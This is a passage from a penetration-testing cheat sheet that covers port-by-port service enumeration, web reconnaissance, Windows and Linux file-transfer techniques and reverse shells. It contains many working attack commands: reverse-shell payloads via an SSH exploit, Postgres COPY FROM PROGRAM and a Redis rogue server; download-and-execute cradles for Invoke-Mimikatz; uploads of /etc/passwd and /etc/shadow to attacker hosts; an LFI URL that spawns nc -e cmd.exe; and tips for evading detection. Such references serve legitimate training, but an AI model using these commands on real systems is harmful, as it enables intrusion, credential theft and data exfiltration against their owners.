Reverse
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.111 80 >/tmp/f"

SSH FUZZ
https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt

cpan Net::SSH2
./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p <PASSWORD>

use auxiliary/fuzzers/ssh/ssh_version_2

SSH-AUDIT
https://github.com/arthepsy/ssh-audit

• https://www.exploit-db.com/exploits/18557 ~ Sysax 5.53 – SSH ‘Username’ Remote Buffer Overflow
• https://www.exploit-db.com/exploits/45001 ~ OpenSSH < 6.6 SFTP – Command Execution
• https://www.exploit-db.com/exploits/45233 ~ OpenSSH 2.3 < 7.7 – Username Enumeration
• https://www.exploit-db.com/exploits/46516 ~ OpenSSH SCP Client – Write Arbitrary Files

http://www.vegardno.net/2017/03/fuzzing-openssh-daemon-using-afl.html

SSH Enum users < 7.7:
https://github.com/six2dez/ssh_enum_script
https://www.exploit-db.com/exploits/45233
python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/dev/null | grep "is a"
```

### TFTP (69/udp)

This is used for tftp-server.

- Vulns tftp in server 1.3, 1.4, 1.9, 2.1, and a few more.
- Checks of FTP Port 21.

```
nmap -p69 --script=tftp-enum.nse 10.11.1.111
```

### Finger (79/tcp)

Ref:HtB Sunday

```
kali@kali:~/HtB/Sunday/finger-user-enum-1.0$ ./finger-user-enum.pl -U /usr/share/seclists/Seclists/Usernames/Names/names.txt -t 10.10.10.76
```

### ISAKMP/IKE (500/udp)

```
ike-scan 10.11.1.111
```

### Rlogin (513/tcp)

```
apt install rsh-client
rlogin -l root 10.11.1.111
```

### Fortinet SSL VPN (541/tcp)

[Fortinet Ports Guide](https://help.fortinet.com/fos50hlp/54/Content/FortiOS/fortigate-ports-and-protocols-54/Images/FortiGate.png)

[SSL VPN Leak](https://opensecurity.global/forums/topic/181-fortinet-ssl-vpn-vulnerability-from-may-2019-being-exploited-in-wild/?__cf_chl_jschl_tk__=42e37b31a0585f7dae3dbce18cafde7c39b81976-1578385705-0-AcuYzrPMO1OuMo59JSPYyzZjiXNbMAIl6sKiXwhQRbMUMZq1Kp3VmWqIVXWZdzTZgFCecXue1Z6xXxU-Rql_GT_ovKiar_-i0CUCKFS85bfNXnUzuOuIwomXje-kH87mNbVHzzh9ediRfVWbJjwtO-ttLEYi7quczLlHQk38UqcumrARs77RrK2mj9zOb8Uwhv6av4QZ9od4fgAIl-F4Kff26MPQjs4LRHsgk5zH6RVwFMP8NdOnCrrzkkGH6_R9Dtw89_QtiOsH1nKB0hBDbtJ2O9AkkMDqw7tl1ip_pVDfnw1lvaZtFq1sRqgYwpan-n6n9f58Xdjcj2UGFKdE32OS7Ete8X7RwXUV9FGUSOhAM5_iK0kMNJg3mskrFVQz0lONaZVvFRdf_1rp69J4oRVat1m7KIQEGpRDe4OvYUb7pfQkNKLcK5s_lVIj2SAJQQ)

### RTSP (554/tcp)

- Web interface, transfer images, streaming

### Rsync (873/tcp)

https://book.hacktricks.xyz/pentesting/873-pentesting-rsync

```
nc -vn 192.168.152.126 873

nmap -sV --script "rsync-list-modules" -p 873  192.168.152.126 --List Shares

rsync -av /home/kali/.ssh rsync://fox@192.168.152.126/fox/.ssh
```

### MSRPC Alternate Ports (1030/1032/1033/1038)

Used by RPC to connect in domain network.

```
nmap -p 3389 --script=rdp-vuln-ms12-020.nse
rdesktop -u username -p <PASSWORD> -g 85% -r disk:share=/root/ 10.11.1.111
rdesktop -u guest -p <PASSWORD> 10.11.1.111 -g 94%
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
xfreerdp /u:bill /p:<PASSWORD> /v:10.11.1.111
```

### PostgreSQL (5432/tcp)

REF: Nibbles, Splodge

https://book.hacktricks.xyz/pentesting/pentesting-postgresql

https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection#rce-from-version-9.3

```
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection

\list # List Databases
\c postgres # Connect to DB
\d <table> # List tables

Priv Esc via Postgres

CREATE TABLE cmd(cmd_output text);
COPY cmd FROM PROGRAM 'bash -i >& /dev/tcp/192.168.49.114/80 0>&1';
```

### Erlang Port Mapper (4369/tcp)

https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd

```
nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111

vncviewer 127.0.0.1:5000 -passwd <PASSWORD>
```

```
https://github.com/Hackplayers/evil-winrm
gem install evil-winrm
evil-winrm -i 10.11.1.111 -u Administrator -p '<PASSWORD>'
evil-winrm -i 10.11.1.111 -u Administrator -H 'hash-pass' -s /scripts/folder
```

### Redis (6379/tcp)

Ref: Sybaris, Wombo

```
https://github.com/Avinash-acid/Redis-Server-Exploit
python redis.py 10.10.10.160 redis

https://github.com/vulhub/redis-rogue-getshell.git
sudo python3 redis-master.py -r 192.168.89.69 -L 192.168.49.89 -P 80 -f RedisModulesSDK/exp.so -c "bash -c 'bash -i >& /dev/tcp/192.168.49.89/8080 0>&1'"
```

### MSDeploy (8172/tcp)

```
Microsoft IIS Deploy port
IP:8172/msdeploy.axd
```

### MongoDB (27017/tcp)

https://book.hacktricks.xyz/pentesting/27017-27018-mongodb

```
nmap -sV --script "mongo* and default" -p 27017 <IP> #By default all the nmap mongo enumerate scripts are used
```

### Unknown Service Ports

- `amap -d 10.11.1.111 8000`
- netcat: makes connections to ports. Can echo strings or give shells: `nc -nv 10.11.1.111 110`
- sfuzz: can connect to ports, udp or tcp, refrain from closing a connection, 	using basic HTTP configurations
- Try zone transfer for subdomains: `dig axfr @10.11.1.111 hostname.box`, `dnsenum 10.11.1.111`, `dnsrecon -d domain.com -t axfr`

Try <USERNAME>:<PASSWORD>, <USERNAME>:<PASSWORD>

## 4. Web Reconnaissance

### WHOIS

```
whois inlanefreight.com
```

### WhatWeb

```
whatweb -a 3 http://dev.inlanefreight.local -v
```

### Virtual Hosts

```
gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

### Certificate Transparency (crt.sh)

```
curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
```

### Banner Grabbing

```
you can use Wappalyzer,BuiltWith,WhatWeb,Nmap,Netcraft
curl -I inlanefreight.com
```

### WAF Detection

```
pip3 install git+https://github.com/EnableSecurity/wafw00f
wafw00f inlanefreight.com
```

### Nikto

```
nikto -h inlanefreight.com -Tuning b
```

### ReconSpider

```
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip
python3 ReconSpider.py http://inlanefreight.com
```

### Automated Reconnaissance

```
you can use FinalRecon,Recon-ng,theHarvester,SpiderFoot,OSINT Framework
```

### Crawling, robots.txt, .well-known & Archives

```bash
# robots.txt and sitemap
curl -s http://<TARGET>/robots.txt
curl -s http://<TARGET>/sitemap.xml

# Common .well-known URIs
for p in security.txt change-password openid-configuration \
         assetlinks.json apple-app-site-association; do
  curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" \
    "http://<TARGET>/.well-known/$p"
done
```

Crawling and JavaScript discovery:

```bash
gospider -s http://<TARGET> -d 2 -c 10
hakrawler -url http://<TARGET> -depth 2
katana -u http://<TARGET> -d 3 -jc
feroxbuster -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Inspect JavaScript bundles for API routes, secrets, and hidden endpoints:

```bash
curl -s http://<TARGET>/ | grep -oE 'src="[^"]+\.js' | cut -d'"' -f2
python3 LinkFinder.py -i http://<TARGET> -d
```

Search engine discovery:

```text
site:<DOMAIN>
site:<DOMAIN> filetype:pdf
site:<DOMAIN> inurl:admin
site:<DOMAIN> intitle:"index of"
inurl:<DOMAIN> ext:php
```

```bash
theHarvester -d <DOMAIN> -b all -l 500
```

Web archives:

```bash
waybackurls <DOMAIN> | tee wayback.txt
gau <DOMAIN> | tee gau.txt
cat wayback.txt gau.txt | sort -u | grep -E '\.(js|php|asp|aspx|jsp|json|xml|bak|old|zip)$'
```

Also query the Wayback Machine manually and use `waybackpack` for older versions of a specific URL.

### HTTPS (443/tcp)

Read the actual SSL CERT to:

- find out potential correct vhost to GET
- is the clock skewed
- any names that could be usernames for bruteforce/guessing.

```
sslscan 10.11.1.111:443
./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST > OUTPUT-FILE.html
nmap -sV --script=ssl-heartbleed 10.1.10.111
mod_ssl,OpenSSL version Openfuck
```

## 5. File Transfers

### Windows

#### Download Operations

##### PowerShell Base64

```
A> md5sum id_rsa.txt
A> cat id_rsa |base64 -w 0;echo
V> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa.txt", [Convert]::FromBase64String("<BASE64_ENCODED_PRIVATE_KEY>"))
V> Get-FileHash C:\Users\Public\id_rsa.txt -Algorithm md5
```

##### PowerShell Web Downloads

PowerShell download methods: `OpenRead`, `OpenReadAsync`, `DownloadData`, `DownloadDataAsync`, `DownloadFile`, `DownloadFileAsync`, `DownloadString`, `DownloadStringAsync`.

```powershell
# DownloadFile — save to disk
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

# DownloadFileAsync — non-blocking
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerViewAsync.ps1')

# DownloadString — fileless execution
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

# Invoke-WebRequest
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Common PowerShell download errors and fixes:

```powershell
# If the SSL/TLS certificate cannot be validated
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# If the response cannot be parsed
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

# Upload helper
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

Reference: <https://gist.github.com/HarmJ0y/bb48307ffa663256e239>

##### SMB Downloads

```
A> sudo impacket-smbserver share -smb2support /tmp/smbshare
V> copy \\192.168.220.133\share\nc.exe
A> sudo impacket-smbserver share -smb2support /tmp/smbshare -user <USER> -password <PASSWORD>
V> net use n: \\192.168.220.133\share /user:<USER> <PASSWORD>

```

##### FTP Downloads

```
A> sudo pip3 install pyftpdlib
A> sudo python3 -m pyftpdlib --port 21
V> PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
# OR
V> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
V> C:\htb> echo USER anonymous >> ftpcommand.txt
V> C:\htb> echo binary >> ftpcommand.txt
V> C:\htb> echo GET file.txt >> ftpcommand.txt
V> C:\htb> echo bye >> ftpcommand.txt
V> C:\htb> ftp -v -n -s:ftpcommand.txt
V> ftp> open 192.168.49.128
V> Log in with USER and PASS first.
V> ftp> USER anonymous

V> ftp> GET file.txt
V> ftp> bye

V> C:\htb>more file.txt
V> This is a test file
```

#### Upload Operations

##### PowerShell Base64

```
V> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
V> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
A> echo '<BASE64_BLOB>' | base64 -d > hosts
```

##### PowerShell Web Uploads

```
ref:- https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
A> pip3 install uploadserver
A> python3 -m uploadserver
V> PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
-------------------------------------------------------------------------------------------------------------------
A> nc -lvnp 8000
V> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
V> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
A> echo <base64> | base64 -d > hosts
```

##### SMB Uploads

```
A> sudo pip3 install wsgidav cheroot
A> sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
V> dir \\192.168.49.128\DavWWWRoot
V> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
V> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

##### FTP Uploads

```
A> sudo python3 -m pyftpdlib --port 21 --write
V> PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
# OR
V> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
V> C:\htb> echo USER anonymous >> ftpcommand.txt
V> C:\htb> echo binary >> ftpcommand.txt
V> C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
V> C:\htb> echo bye >> ftpcommand.txt
V> C:\htb> ftp -v -n -s:ftpcommand.txt
V> ftp> open 192.168.49.128
V> ftp> USER anonymous
V> ftp> PUT c:\windows\system32\drivers\etc\hosts
V> ftp> bye
```

### Linux

#### Download Operations

##### Base64

```
A> md5sum id_rsa
A> cat id_rsa |base64 -w 0;echo
V>  echo '<BASE64_ENCODED_PRIVATE_KEY>' | base64 -d > id_rsa
V> md5sum id_rsa
```

##### Wget & cURL

```
V> wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
V> curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
V> curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
V> wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

```shell
curl -v http://<DOMAIN>                                                        // verbose output
curl -X POST http://<DOMAIN>                                                   // use POST method
curl -X PUT http://<DOMAIN>                                                    // use PUT method
curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd                 // use --path-as-is to handle /../ or /./ in the given URL
curl --proxy http://127.0.0.1:8080                                             // use proxy
curl -F myFile=@<FILE> http://<RHOST>                                          // file upload
curl${IFS}<LHOST>/<FILE>                                                       // Internal Field Separator (IFS) example
```

##### Bash /dev/tcp

```
V> exec 3<>/dev/tcp/10.10.10.32/80
V> echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
V> cat <&3
```

##### SSH Downloads

```
A> sudo systemctl enable ssh
A> sudo systemctl start ssh
A> netstat -lnpt
V> scp plaintext@192.168.49.128:/root/myroot.txt .
```

#### Upload Operations

##### HTTP Upload Server

```
A> sudo python3 -m pip install --user uploadserver
A> openssl req -x509 -out /differentdirectory/server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
A>  mkdir https && cd https
A> sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
V> curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

##### Alternative HTTP Servers

```
V> python3 -m http.server
# OR
V> python2.7 -m SimpleHTTPServer
# OR
V> php -S 0.0.0.0:8000
# OR
V> ruby -run -ehttpd . -p8000
A> wget 192.168.49.128:8000/filetotransfer.txt
```

##### SCP Upload

```
V> scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

### Transferring Files with Code

#### Python

```
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

```shell
sudo python -m SimpleHTTPServer 80
sudo python3 -m http.server 80
```

#### PHP

```
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
# OR
php -r 'const BUFFER = 1024; $fremote =
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
# OR
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

#### Ruby

```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

#### Perl

```
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

#### JavaScript

Create `wget.js` with the following contents:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Run it:

```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

#### VBScript

Create `wget.vbs` with the following contents:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Run it:

```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

#### Python 3 Upload

```
A> python3 -m uploadserver
A> python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

#### Certutil

```cmd
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```

#### Netcat

```shell
nc -lnvp <LPORT> > <FILE>
nc <RHOST> <RPORT> < <FILE>
```

#### Impacket

```shell
sudo impacket-smbserver <SHARE> ./
sudo impacket-smbserver <SHARE> . -smb2support
copy * \\<LHOST>\<SHARE>
```

#### PowerShell

```cmd
iwr <LHOST>/<FILE> -o <FILE>
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```

#### Bash only

#### wget version

Paste directly to the shell.

```bash
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
```

```shell
__wget http://<LHOST>/<FILE>
```

#### curl version

```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

```shell
__curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

### Miscellaneous

#### Netcat & Ncat

##### Forward File Transfer

```
V> nc -l -p 8000 > SharpKatz.exe
# OR
V> ncat -l -p 8000 --recv-only > SharpKatz.exe
A> nc -q 0 192.168.49.128 8000 < SharpKatz.exe
# OR
A> ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

##### Reverse File Transfer

```
A> sudo nc -l -p 443 -q 0 < SharpKatz.exe
V> nc 192.168.49.128 443 > SharpKatz.exe
# OR
A> sudo ncat -l -p 443 --send-only < SharpKatz.exe
V> ncat 192.168.49.128 443 --recv-only > SharpKatz.exe

--------------------------------------------------------

A> sudo nc -l -p 443 -q 0 < SharpKatz.exe
# OR
A> sudo ncat -l -p 443 --send-only < SharpKatz.exe
V> cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

#### PowerShell Sessions

```
client> Test-NetConnection -ComputerName DATABASE01 -Port 5985
# OR
client> $Session = New-PSSession -ComputerName DATABASE01
client> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
Server> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

#### RDP Drive Redirection

Mount a local directory inside an RDP session with the drive-redirection flag, then access it through `\\tsclient\`.

```bash
# rdesktop
rdesktop 10.10.10.132 -d HTB -u administrator -p '<PASSWORD>' -r disk:linux='/home/user/rdesktop/files'

# FreeRDP
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'<PASSWORD>' /drive:linux,/home/plaintext/htb/academy/filetransfer
xfreerdp /v:172.16.5.35 /u:<USER> /p:'<PASSWORD>' /cert:ignore /dynamic-resolution /drive:share,/PATH_TO_SHARE_FOLDER/
```

Inside the remote session, open `\\tsclient\` and interact with the shared folder.

![RDP drive redirection](https://github.com/user-attachments/assets/2b0efc0c-b6ad-4ce8-b49b-2ba72be8a1bb)

### Protected File Transfers

#### Windows Encryption

Download `Invoke-AESEncryption.ps1` from the [PowerShell Gallery](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1), then import and use it:

```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key '<KEY>' -Path .\scan-results.txt
```

#### Linux Encryption

```
# Encrypting
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd

```

### Receiving Files over HTTP/S

This technique enables the Nginx `PUT` method so files can be uploaded with `curl -T`.

#### Nginx — Enabling PUT

1. Create an upload directory and give Nginx ownership:

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

2. Add an Nginx site that enables `dav_methods PUT`:

```nginx
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

3. Enable the site, restart Nginx, and confirm it is listening:

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service
sudo rm /etc/nginx/sites-enabled/default   # if the default site conflicts
ss -lnpt | grep 9001
tail -2 /var/log/nginx/error.log
```

4. Test the upload:

```bash
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

### Living off the Land

Use built-in binaries to download or upload files without dropping tools. See LOLBAS for Windows and GTFOBins for Linux.

#### LOLBAS — Certreq Upload

```cmd
:: On the attack host
sudo nc -lvnp 8000

:: On the Windows target — upload win.ini
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

#### GTFOBins — OpenSSL Download

```bash
# On the attack host: serve the file over TLS
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# On the target: receive the file
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

#### Bitsadmin Download

```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
bitsadmin /transfer myJob /download /priority high http://10.10.16.33:8000/bb.txt C:\Users\htb-student\Desktop\bb.txt
```

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

#### Certutil Download

```cmd
certutil -urlcache -split -f http://10.10.10.32/nc.exe
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

#### GfxDownloadWrapper Download

```cmd
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

#### WinHttpRequest (COM)

```powershell
$h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$h.open('GET','http://10.10.10.32/nc.exe',$false)
$h.send()
iex $h.ResponseText
```

#### Msxml2 (COM)

```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP
$h.open('GET','http://10.10.10.32/nc.exe',$false)
$h.send()
iex $h.responseText
```

#### BITS (COM)

```powershell
Import-Module bitstransfer
Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t
$r = gc $env:temp\t
rm $env:temp\t
iex $r
```

### Detection & Evasion

Download methods leave distinct artifacts. Common detection signals:

- PowerShell `Invoke-WebRequest`/`Invoke-RestMethod` user-agent.
- `certutil` user-agent (`Microsoft-CryptoAPI`).
- BITS transfers (`Microsoft BITS` user-agent and `Start-BitsTransfer` events).
- WinHttpRequest/Msxml2 COM requests from Office or script hosts.
- Large outbound transfers, uncommon destinations, and executable downloads.
- Sysmon Event IDs 1 (process), 3 (network), 11 (file create), 22 (DNS).

Evasion basics:

```powershell
# Change the PowerShell download user-agent
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<ATTACKER>/file -UserAgent $UserAgent -OutFile file
```

- Prefer HTTPS and legitimate cloud services (GitHub, OneDrive, S3) over raw HTTP.
- Use built-in/LOLBins (`certutil`, `bitsadmin`, `GfxDownloadWrapper`) where appropriate.
- Encode or chunk payloads; avoid obvious strings.
- Test detection in the lab before relying on a method in production.
- Egress filtering, proxy logging, and EDR rule tuning are the defensive counterparts.

### PHP Webserver

```shell
sudo php -S 127.0.0.1:80
```

### File Enumeration & Analysis

#### Common

```bash
# Check real file type
file file.xxx

# Analyze strings
strings file.xxx
strings -a -n 15 file.xxx # Check the entire file and outputs strings longer than 15 chars

# Check embedded files
binwalk file.xxx # Check
binwalk -e file.xxx # Extract

# Check as binary file in hex
ghex file.xxx

# Check metadata
exiftool file.xxx

# Stego tool for multiple formats
wget https://embeddedsw.net/zip/OpenPuff_release.zip
unzip OpenPuff_release.zip -d ./OpenPuff
wine OpenPuff/OpenPuff_release/OpenPuff.exe
```

#### Disk files

```bash
# guestmount can mount any kind of disk file
sudo apt-get install libguestfs-tools
guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
```

#### Images

```bash
# Stego
wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
java -jar stegsolve.jar

# Stegpy
stegpy -p file.png

# Check png corrupted
pngcheck -v image.jpeg

# Check what kind of image is
identify -verbose image.jpeg
```

#### Audio

```bash
# Check spectrogram
wget https://code.soundsoftware.ac.uk/attachments/download/2561/sonic-visualiser_4.0_amd64.deb
dpkg -i sonic-visualiser_4.0_amd64.deb

# Check for Stego
hideme stego.mp3 -f && cat output.txt #AudioStego
```

### Privilege Escalation Transfer Setup

```
# Docker
https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/

https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout

https://gtfobins.github.io/gtfobins/docker/

# Docker Escape
Proving Grounds Sirol / Peppo
```

#### Set up Webserver

```
python -m SimpleHTTPServer 8080

python3 -m http.server 8080

php -S 0.0.0.0:8080

ruby -run  -e -httpd . -p 8080

https://github.com/sc0tfree/updog
updog
```

#### Set up FTP Server

```
# Install pyftpdlib
pip install pyftpdlib

# Run (-w flag allows anonymous write access)
python -m pyftpdlib -p 21 -w
```

#### Set up TFTP

```
# In Kali
atftpd --daemon --port 69 /tftp

# In reverse Windows
tftp -i 10.11.1.111 GET nc.exe
nc.exe -e cmd.exe 10.11.1.111 4444

http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444
```

## 6. Shells

### Reverse Shell

```
# bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
